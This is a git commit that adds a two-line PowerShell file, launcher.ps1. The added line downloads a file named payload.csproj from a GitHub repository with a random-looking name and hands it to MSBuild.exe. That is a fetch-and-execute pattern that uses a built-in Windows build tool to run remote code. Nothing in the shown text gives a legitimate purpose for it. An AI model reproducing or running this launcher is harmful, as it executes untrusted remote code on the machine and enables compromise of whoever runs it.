432447fbebbf1cd08716daf5290586eaa1858e08
Lucius <57964702+lucid251@users.noreply.github.com>
2025-07-05 15:16:56 +0300

    Create launcher.ps1

---
+++ launcher.ps1
@@ -0,0 +1,2 @@
+# launcher.ps1 content
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe (New-Object Net.WebClient).DownloadString('https://github.com/lucid251/HGJFJTKH24/blob/main/payload.csproj')
